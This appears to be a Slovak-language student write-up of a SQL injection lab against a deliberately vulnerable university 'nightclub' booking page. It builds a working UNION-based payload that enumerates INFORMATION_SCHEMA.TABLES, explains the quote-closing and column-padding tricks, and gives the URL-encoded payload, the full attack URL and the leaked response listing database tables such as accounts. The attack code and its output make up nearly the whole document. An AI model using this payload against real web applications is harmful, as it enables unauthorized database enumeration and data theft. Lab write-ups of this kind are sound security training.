Select:
```mysql
SELECT JSON_ARRAYAGG(CONCAT_WS(',',
COALESCE(TABLE_CATALOG,''),COALESCE(TABLE_SCHEMA,''),COALESCE(TABLE_NAME,''),COALESCE(ENGINE,''),COALESCE(VERSION,''),COALESCE(ROW_FORMAT,''),COALESCE(TABLE_ROWS,''),COALESCE(AVG_ROW_LENGTH,''),COALESCE(DATA_LENGTH,''),COALESCE(MAX_DATA_LENGTH,''),COALESCE(INDEX_LENGTH,''),COALESCE(DATA_FREE,''),COALESCE(AUTO_INCREMENT,''),COALESCE(CREATE_TIME,''),COALESCE(UPDATE_TIME,''),COALESCE(CHECK_TIME,''),COALESCE(TABLE_COLLATION,''),COALESCE(CHECKSUM,''),COALESCE(CREATE_OPTIONS,''),COALESCE(TABLE_COMMENT,'')
)),NULL,NULL,NULL FROM INFORMATION_SCHEMA.TABLES
```

Teraz len stačí pridať:
- `'` ukončenie stringu
- `UNION` spojenie s ďalším selectom
- `,NULL,NULL,NULL` pridanie stĺpcov aby sa počet zhodoval s predchádzajúcim selectom
- `WHERE '1'='1` aby nasledujúci `'` nespôsobil syntax error.


Payload:
```
' UNION
SELECT JSON_ARRAYAGG(CONCAT_WS(',',
COALESCE(TABLE_CATALOG,''),COALESCE(TABLE_SCHEMA,''),COALESCE(TABLE_NAME,''),COALESCE(ENGINE,''),COALESCE(VERSION,''),COALESCE(ROW_FORMAT,''),COALESCE(TABLE_ROWS,''),COALESCE(AVG_ROW_LENGTH,''),COALESCE(DATA_LENGTH,''),COALESCE(MAX_DATA_LENGTH,''),COALESCE(INDEX_LENGTH,''),COALESCE(DATA_FREE,''),COALESCE(AUTO_INCREMENT,''),COALESCE(CREATE_TIME,''),COALESCE(UPDATE_TIME,''),COALESCE(CHECK_TIME,''),COALESCE(TABLE_COLLATION,''),COALESCE(CHECKSUM,''),COALESCE(CREATE_OPTIONS,''),COALESCE(TABLE_COMMENT,'')
)),NULL,NULL,NULL FROM INFORMATION_SCHEMA.TABLES
WHERE '1'='1
```

Encoded:
```
%27%20UNION%0ASELECT%20JSON_ARRAYAGG%28CONCAT_WS%28%27%2C%27%2C%0ACOALESCE%28TABLE_CATALOG%2C%27%27%29%2CCOALESCE%28TABLE_SCHEMA%2C%27%27%29%2CCOALESCE%28TABLE_NAME%2C%27%27%29%2CCOALESCE%28ENGINE%2C%27%27%29%2CCOALESCE%28VERSION%2C%27%27%29%2CCOALESCE%28ROW_FORMAT%2C%27%27%29%2CCOALESCE%28TABLE_ROWS%2C%27%27%29%2CCOALESCE%28AVG_ROW_LENGTH%2C%27%27%29%2CCOALESCE%28DATA_LENGTH%2C%27%27%29%2CCOALESCE%28MAX_DATA_LENGTH%2C%27%27%29%2CCOALESCE%28INDEX_LENGTH%2C%27%27%29%2CCOALESCE%28DATA_FREE%2C%27%27%29%2CCOALESCE%28AUTO_INCREMENT%2C%27%27%29%2CCOALESCE%28CREATE_TIME%2C%27%27%29%2CCOALESCE%28UPDATE_TIME%2C%27%27%29%2CCOALESCE%28CHECK_TIME%2C%27%27%29%2CCOALESCE%28TABLE_COLLATION%2C%27%27%29%2CCOALESCE%28CHECKSUM%2C%27%27%29%2CCOALESCE%28CREATE_OPTIONS%2C%27%27%29%2CCOALESCE%28TABLE_COMMENT%2C%27%27%29%0A%29%29%2CNULL%2CNULL%2CNULL%20FROM%20INFORMATION_SCHEMA.TABLES%0AWHERE%20%271%27%3D%271
```

Whole URL:
```
http://boura.fit.cvut.cz/nightclub/bookgirl.php?girl=%27%20UNION%0ASELECT%20JSON_ARRAYAGG%28CONCAT_WS%28%27%2C%27%2C%0ACOALESCE%28TABLE_CATALOG%2C%27%27%29%2CCOALESCE%28TABLE_SCHEMA%2C%27%27%29%2CCOALESCE%28TABLE_NAME%2C%27%27%29%2CCOALESCE%28ENGINE%2C%27%27%29%2CCOALESCE%28VERSION%2C%27%27%29%2CCOALESCE%28ROW_FORMAT%2C%27%27%29%2CCOALESCE%28TABLE_ROWS%2C%27%27%29%2CCOALESCE%28AVG_ROW_LENGTH%2C%27%27%29%2CCOALESCE%28DATA_LENGTH%2C%27%27%29%2CCOALESCE%28MAX_DATA_LENGTH%2C%27%27%29%2CCOALESCE%28INDEX_LENGTH%2C%27%27%29%2CCOALESCE%28DATA_FREE%2C%27%27%29%2CCOALESCE%28AUTO_INCREMENT%2C%27%27%29%2CCOALESCE%28CREATE_TIME%2C%27%27%29%2CCOALESCE%28UPDATE_TIME%2C%27%27%29%2CCOALESCE%28CHECK_TIME%2C%27%27%29%2CCOALESCE%28TABLE_COLLATION%2C%27%27%29%2CCOALESCE%28CHECKSUM%2C%27%27%29%2CCOALESCE%28CREATE_OPTIONS%2C%27%27%29%2CCOALESCE%28TABLE_COMMENT%2C%27%27%29%0A%29%29%2CNULL%2CNULL%2CNULL%20FROM%20INFORMATION_SCHEMA.TABLES%0AWHERE%20%271%27%3D%271
```

http://boura.fit.cvut.cz/nightclub/bookgirl.php?girl=

Answer:
```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
	<title>Night club template</title>
	<link rel="stylesheet" href="style.css" type="text/css" charset="utf-8" />
</head>

<body>
<div id="container">
	<div id="menu">

		<ul>
			<li id="m01"><a href="index.php">Home</a></li>
			<li id="m02"><a href="index-2.php">Photos</a></li>
			<li id="m03"><a href="index-3.php">Parties</a></li>
			<li id="m04"><a href="index-4.php">Booking</a></li>
			<li id="m05"><a href="index-5.php">Login</a></li>
		</ul>

	</div>
	<div id="header">
		<div id="dj">
		<div id="welcome">
			<h2>Booking</h2>
<b>Girl #["def,information_schema,CHARACTER_SETS,MEMORY,10,Fixed,,384,0,16434816,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=43690,", "def,information_schema,COLLATIONS,MEMORY,10,Fixed,,231,0,16704765,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=72628,", "def,information_schema,COLLATION_CHARACTER_SET_APPLICABILITY,MEMORY,10,Fixed,,195,0,16357770,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=86037,", "def,information_schema,COLUMNS,InnoDB,10,Dynamic,,0,16384,0,0,8388608,,,,,utf8_general_ci,,max_rows=2789,", "def,information_schema,COLUMN_PRIVILEGES,MEMORY,10,Fixed,,2565,0,16757145,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=6540,", "def,information_schema,ENGINES,MEMORY,10,Fixed,,490,0,16574250,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=34239,", "def,information_schema,EVENTS,InnoDB,10,Dynamic,,0,16384,0,0,8388608,,,,,utf8_general_ci,,max_rows=618,", "def,information_schema,FILES,MEMORY,10,Fixed,,14468,0,16768412,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=1159,", "def,information_schema,GLOBAL_STATUS,MEMORY,10,Fixed,,3268,0,16755036,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=5133,", "def,information_schema,GLOBAL_VARIABLES,MEMORY,10,Fixed,,3268,0,16755036,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=5133,", "def,information_schema,KEY_COLUMN_USAGE,MEMORY,10,Fixed,,4637,0,16762755,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=3618,", "def,information_schema,OPTIMIZER_TRACE,InnoDB,10,Dynamic,,0,16384,0,0,8388608,,,,,utf8_general_ci,,max_rows=578524,", "def,information_schema,PARAMETERS,InnoDB,10,Dynamic,,0,16384,0,0,8388608,,,,,utf8_general_ci,,max_rows=6021,", "def,information_schema,PARTITIONS,InnoDB,10,Dynamic,,0,16384,0,0,8388608,,,,,utf8_general_ci,,max_rows=5596,", "def,information_schema,PLUGINS,InnoDB,10,Dynamic,,0,16384,0,0,8388608,,,,,utf8_general_ci,,max_rows=11328,", "def,information_schema,PROCESSLIST,InnoDB,10,Dynamic,,0,16384,0,0,8388608,,,,,utf8_general_ci,,max_rows=22369,", "def,information_schema,PROFILING,MEMORY,10,Fixed,,308,0,16562084,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=54471,", "def,information_schema,REFERENTIAL_CONSTRAINTS,MEMORY,10,Fixed,,4814,0,16767162,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=3485,", "def,information_schema,ROUTINES,InnoDB,10,Dynamic,,0,16384,0,0,8388608,,,,,utf8_general_ci,,max_rows=582,", "def,information_schema,SCHEMATA,MEMORY,10,Fixed,,3464,0,16738048,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=4843,", "def,information_schema,SCHEMA_PRIVILEGES,MEMORY,10,Fixed,,2179,0,16736899,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=7699,", "def,information_schema,SESSION_STATUS,MEMORY,10,Fixed,,3268,0,16755036,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=5133,", "def,information_schema,SESSION_VARIABLES,MEMORY,10,Fixed,,3268,0,16755036,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=5133,", "def,information_schema,STATISTICS,MEMORY,10,Fixed,,5753,0,16752736,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=2916,", "def,information_schema,TABLES,MEMORY,10,Fixed,,9441,0,16757775,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=1777,", "def,information_schema,TABLESPACES,MEMORY,10,Fixed,,6951,0,16772763,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=2413,", "def,information_schema,TABLE_CONSTRAINTS,MEMORY,10,Fixed,,2504,0,16721712,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=6700,", "def,information_schema,TABLE_PRIVILEGES,MEMORY,10,Fixed,,2372,0,16748692,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=7073,", "def,information_schema,TRIGGERS,InnoDB,10,Dynamic,,0,16384,0,0,8388608,,,,,utf8_general_ci,,max_rows=568,", "def,information_schema,USER_PRIVILEGES,MEMORY,10,Fixed,,1986,0,16726092,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=8447,", "def,information_schema,VIEWS,InnoDB,10,Dynamic,,0,16384,0,0,8388608,,,,,utf8_general_ci,,max_rows=6797,", "def,information_schema,INNODB_LOCKS,MEMORY,10,Fixed,,31244,0,16746784,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=536,", "def,information_schema,INNODB_TRX,MEMORY,10,Fixed,,4536,0,16746912,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=3698,", "def,information_schema,INNODB_SYS_DATAFILES,MEMORY,10,Fixed,,12007,0,16773779,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=1397,", "def,information_schema,INNODB_FT_CONFIG,MEMORY,10,Fixed,,1163,0,16705332,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=14425,", "def,information_schema,INNODB_SYS_VIRTUAL,MEMORY,10,Fixed,,17,0,11883850,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=986895,", "def,information_schema,INNODB_CMP,MEMORY,10,Fixed,,25,0,13107200,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=671088,", "def,information_schema,INNODB_FT_BEING_DELETED,MEMORY,10,Fixed,,9,0,9437184,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=1864135,", "def,information_schema,INNODB_CMP_RESET,MEMORY,10,Fixed,,25,0,13107200,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=671088,", "def,information_schema,INNODB_CMP_PER_INDEX,MEMORY,10,Fixed,,1755,0,16728660,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=9559,", "def,information_schema,INNODB_CMPMEM_RESET,MEMORY,10,Fixed,,29,0,15204352,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=578524,", "def,information_schema,INNODB_FT_DELETED,MEMORY,10,Fixed,,9,0,9437184,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=1864135,", "def,information_schema,INNODB_BUFFER_PAGE_LRU,MEMORY,10,Fixed,,6669,0,16765866,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=2515,", "def,information_schema,INNODB_LOCK_WAITS,MEMORY,10,Fixed,,599,0,16749238,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=28008,", "def,information_schema,INNODB_TEMP_TABLE_INFO,MEMORY,10,Fixed,,1011,0,16694643,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=16594,", "def,information_schema,INNODB_SYS_INDEXES,MEMORY,10,Fixed,,618,0,16615548,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=27147,", "def,information_schema,INNODB_SYS_TABLES,MEMORY,10,Fixed,,2091,0,16736364,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=8023,", "def,information_schema,INNODB_SYS_FIELDS,MEMORY,10,Fixed,,594,0,16609428,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=28244,", "def,information_schema,INNODB_CMP_PER_INDEX_RESET,MEMORY,10,Fixed,,1755,0,16728660,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=9559,", "def,information_schema,INNODB_BUFFER_PAGE,MEMORY,10,Fixed,,6852,0,16766844,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=2448,", "def,information_schema,INNODB_FT_DEFAULT_STOPWORD,MEMORY,10,Fixed,,56,0,14680064,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=299593,", "def,information_schema,INNODB_FT_INDEX_TABLE,MEMORY,10,Fixed,,1054,0,16744898,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=15917,", "def,information_schema,INNODB_FT_INDEX_CACHE,MEMORY,10,Fixed,,1054,0,16744898,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=15917,", "def,information_schema,INNODB_SYS_TABLESPACES,MEMORY,10,Fixed,,2133,0,16752582,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=7865,", "def,information_schema,INNODB_METRICS,MEMORY,10,Fixed,,2994,0,16742448,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=5603,", "def,information_schema,INNODB_SYS_FOREIGN_COLS,MEMORY,10,Fixed,,1748,0,16738848,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=9597,", "def,information_schema,INNODB_CMPMEM,MEMORY,10,Fixed,,29,0,15204352,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=578524,", "def,information_schema,INNODB_BUFFER_POOL_STATS,MEMORY,10,Fixed,,257,0,16332350,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=65280,", "def,information_schema,INNODB_SYS_COLUMNS,MEMORY,10,Fixed,,610,0,16613350,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=27503,", "def,information_schema,INNODB_SYS_FOREIGN,MEMORY,10,Fixed,,1752,0,16700064,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=9576,", "def,information_schema,INNODB_SYS_TABLESTATS,MEMORY,10,Fixed,,1215,0,16763355,0,0,,2024-04-26 19:50:12,,,utf8_general_ci,,max_rows=13808,", "def,bek,accounts,MyISAM,10,Dynamic,2,56,112,281474976710655,3072,0,3,2021-01-02 09:18:34,2021-01-02 09:18:34,2021-11-01 15:30:30,utf8_general_ci,,,", "def,bek,performers,MyISAM,10,Dynamic,3,88,264,281474976710655,7168,0,,2021-01-02 09:18:34,2021-01-02 09:18:34,2021-11-01 15:29:53,utf8_general_ci,,,", "def,bek,stories,MyISAM,10,Dynamic,4,173,692,281474976710655,2048,0,12346,2021-01-02 09:18:34,2021-01-02 09:18:34,2021-11-01 15:29:11,utf8_general_ci,,,"]  is currently with a customer. Please try again later!</b>		</div>
		</div>
		<div class="clear"></div>
	</div>
	<div id="middle"></div>
	<div id="middle2"></div>
	<div id="footer">
		<p>Copyright � Website name all rights reserved. |  <a href="http://www.freewebsitetemplates.com/termsofuse">Terms of use</a></p>
	</div>
</div>
</body>
</html>
```

Ďalej spracujeme v `query_1.py`.

